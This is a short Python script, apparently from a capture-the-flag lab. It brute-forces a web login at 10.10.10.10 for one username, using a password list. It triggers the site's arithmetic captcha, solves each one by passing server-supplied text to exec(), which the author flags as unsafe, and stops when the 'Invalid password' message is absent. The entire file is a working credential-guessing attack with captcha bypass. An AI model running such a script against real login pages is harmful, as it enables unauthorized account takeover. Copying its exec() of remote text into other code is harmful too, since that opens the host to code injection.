import requests
import re

target_ip = "10.10.10.10"
username = "user"
passwords_file = "/media/sf_shared/passwords.txt"

with open(passwords_file, "r") as f:
	passwords = f.readlines()

#Initial attempts
for i in range(10):
	data = {"username": "test", "password": "test"}
	response = requests.post("http://" + target_ip + "/login", data=data)

for password in passwords:
	#Finding and solving the captcha
	captcha = re.findall("[0-9]* + .* = \?", str(response.content, "utf-8"))
	try:
		exec("solution =" + captcha[0][4:-4]) #Unsafe!!!
	except:
		pass

	#Making the attempt
	data = {"username": username, "password": password[:-1], "captcha": solution}
	response = requests.post("http://" + target_ip + "/login", data=data)

	if ("Invalid captcha" in str(response.content, "utf-8")):
		print("error solving captcha : " + captcha[0])

	#Checking if password is correct
	if ("Invalid password" not in str(response.content, "utf-8")):
		print("found password for user " + username + " : " + password)
		exit()
